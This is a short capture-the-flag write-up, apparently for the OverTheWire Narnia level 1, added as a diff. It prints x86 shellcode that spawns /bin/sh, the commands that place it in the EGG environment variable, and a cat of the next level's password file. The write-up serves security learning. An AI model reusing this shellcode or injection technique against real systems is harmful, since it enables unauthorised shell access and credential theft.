@@ -1,0 +1,29 @@
+Fun little level!
+
+Upon running the executable it tells you to assign something to the environment variable 'EGG'.
+
+Upon checking the source code, you can see that it attempts to assign a function pointer to whatever value is stored at EGG.
+
+Sounds like the perfect place to execute some nice shellcode!
+
+_______________________________________________________________________
+payload = '\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
+print(payload)
+_______________________________________________________________________
+
+^ Python2 payload for outputting shellcode bytes.
+
+This shellcode executes /bin/sh, of course with the permissions of the file executing them. (narnia2 in this case)
+
+so...
+
+____________________________________________
+export EGG=$(python /tmp/taldgan/payload.py)
+/narnia/narnia1
+
+'Executing EGG...' outputted
+Then I had a shell!
+
+$cat /etc/narnia_pass/narnia2
+
+____________________________________________
